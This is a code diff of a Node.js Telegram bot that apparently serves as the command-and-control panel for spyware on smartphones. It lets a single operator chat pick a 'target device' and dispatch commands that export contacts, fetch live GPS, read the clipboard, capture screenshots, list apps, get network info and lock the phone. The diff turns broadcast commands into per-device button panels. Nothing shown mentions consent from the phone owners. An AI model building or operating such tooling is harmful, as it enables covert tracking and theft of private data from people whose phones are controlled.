@@ -30,21 +30,13 @@ bot.onText(/\/start/, async (msg) => {
 
 Permanent Chat ID linked: \`${PERMANENT_CHAT_ID}\`
 
-**Available Commands:**
-- /list (List all connected smartphones)
-- /device (Hardware & Battery stats)
-- /contacts (Export phonebook)
-- /location (Get live GPS pin)
-- /clipboard (Sync active clipboard)
-- /screenshot (Capture screen)
-- /apps (List installed apps)
-- /lock (Lock device remotely)
-- /ip (Check network info)
+**Quick Start:**
+- Send /list to view all connected smartphones and open their interactive control panels.
   `;
   bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
 });
 
-// 2. /list Command: Show all connected smartphones
+// 2. /list Command: Show interactive device selection buttons
 bot.onText(/\/list/, async (msg) => {
   const chatId = msg.chat.id;
   if (chatId.toString() !== PERMANENT_CHAT_ID) return;
@@ -54,35 +46,89 @@ bot.onText(/\/list/, async (msg) => {
     return bot.sendMessage(chatId, '⚠️ No connected smartphones found. Open the app on your devices.');
   }
 
-  let response = `📱 **Connected Smart Devices (${devices.length}):**\n\n`;
-  devices.forEach((d, index) => {
-    response += `${index + 1}. **Device ID:** \`device_${d.deviceId.substring(0, 12)}...\`\n   Last Seen: ${new Date(d.lastSeen).toLocaleTimeString()}\n\n`;
+  const inlineKeyboard = devices.map((d, index) => {
+    const cleanId = d.deviceId.replace(/^device_/, '');
+    const shortId = cleanId.substring(0, 8);
+    return [{ text: `📱 Device ${index + 1} (${shortId}...)`, callback_data: `dev_${d.deviceId}` }];
   });
-  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
+
+  bot.sendMessage(chatId, '📱 **Connected Smart Devices:**\nSelect a device below to access its control panel:', {
+    reply_markup: { inline_keyboard: inlineKeyboard }
+  });
 });
 
-// Helper to broadcast command to all user devices
-async function queueCommandForAllDevices(commandName, description) {
-  const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
-  if (devices.length === 0) {
-    return bot.sendMessage(PERMANENT_CHAT_ID, '⚠️ No active devices found.');
+// 3. Handle Interactive Button Clicks (Device Selection & Command Dispatch)
+bot.on('callback_query', async (query) => {
+  const chatId = query.message.chat.id;
+  if (chatId.toString() !== PERMANENT_CHAT_ID) return;
+
+  const data = query.data;
+
+  if (data.startsWith('dev_')) {
+    const targetDeviceId = data.replace('dev_', '');
+    const cleanId = targetDeviceId.replace(/^device_/, '');
+    const shortId = cleanId.substring(0, 8);
+
+    // Command panel for the selected device
+    const commandKeyboard = [
+      [
+        { text: '📊 Device Stats', callback_data: `cmd_device_${targetDeviceId}` },
+        { text: '📍 Live GPS', callback_data: `cmd_location_${targetDeviceId}` }
+      ],
+      [
+        { text: '📋 Clipboard', callback_data: `cmd_clipboard_${targetDeviceId}` },
+        { text: '📇 Contacts', callback_data: `cmd_contacts_${targetDeviceId}` }
+      ],
+      [
+        { text: '📸 Screenshot', callback_data: `cmd_screenshot_${targetDeviceId}` },
+        { text: '📱 Installed Apps', callback_data: `cmd_apps_${targetDeviceId}` }
+      ],
+      [
+        { text: '🌐 Network / IP', callback_data: `cmd_ip_${targetDeviceId}` },
+        { text: '🔒 Remote Lock', callback_data: `cmd_lock_${targetDeviceId}` }
+      ],
+      [
+        { text: '« Back to Device List', callback_data: 'back_to_list' }
+      ]
+    ];
+
+    bot.editMessageText(`📱 **Target Device Selected:** \`${shortId}...\`\nChoose a command to execute:`, {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      parse_mode: 'Markdown',
+      reply_markup: { inline_keyboard: commandKeyboard }
+    });
+  } 
+  else if (data.startsWith('cmd_')) {
+    // Format: cmd_<action>_<deviceId>
+    const parts = data.split('_');
+    const action = parts[1]; // device, location, clipboard, etc.
+    const targetDeviceId = parts.slice(2).join('_'); // rest is deviceId
+
+    pendingCommands[targetDeviceId] = `/${action}`;
+    const shortId = targetDeviceId.replace(/^device_/, '').substring(0, 8);
+
+    bot.answerCallbackQuery(query.id, { text: `Command /${action} dispatched!` });
+    bot.sendMessage(chatId, `🔍 Executing \`/${action}\` on Device ID: \`${shortId}...\``, { parse_mode: 'Markdown' });
+  } 
+  else if (data === 'back_to_list') {
+    const devices = await User.find({ chatId: PERMANENT_CHAT_ID });
+    if (devices.length === 0) {
+      return bot.editMessageText('⚠️ No connected smartphones found.', { chat_id: chatId, message_id: query.message.message_id });
+    }
+
+    const inlineKeyboard = devices.map((d, index) => {
+      const cleanId = d.deviceId.replace(/^device_/, '');
+      const shortId = cleanId.substring(0, 8);
+      return [{ text: `📱 Device ${index + 1} (${shortId}...)`, callback_data: `dev_${d.deviceId}` }];
+    });
+
+    bot.editMessageText('📱 **Connected Smart Devices:**\nSelect a device below to access its control panel:', {
+      chat_id: chatId,
+      message_id: query.message.message_id,
+      reply_markup: { inline_keyboard: inlineKeyboard }
+    });
   }
-
-  devices.forEach(d => {
-    pendingCommands[d.deviceId] = commandName;
-  });
-
-  bot.sendMessage(PERMANENT_CHAT_ID, `🔍 ${description} across **${devices.length}** connected device(s)...`, { parse_mode: 'Markdown' });
-}
-
-// Command Handlers
-bot.onText(/\/device/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/device', 'Requesting device metrics'); });
-bot.onText(/\/contacts/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/contacts', 'Fetching phone contacts'); });
-bot.onText(/\/location/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/location', 'Requesting live GPS coordinates'); });
-bot.onText(/\/clipboard/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/clipboard', 'Fetching active device clipboard'); });
-bot.onText(/\/screenshot/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/screenshot', 'Capturing screen snapshot'); });
-bot.onText(/\/apps/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/apps', 'Compiling installed apps list'); });
-bot.onText(/\/lock/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/lock', 'Sending remote lock command'); });
-bot.onText(/\/ip/, (msg) => { if (msg.chat.id.toString() === PERMANENT_CHAT_ID) queueCommandForAllDevices('/ip', 'Fetching network info'); });
+});
 
 module.exports = bot;
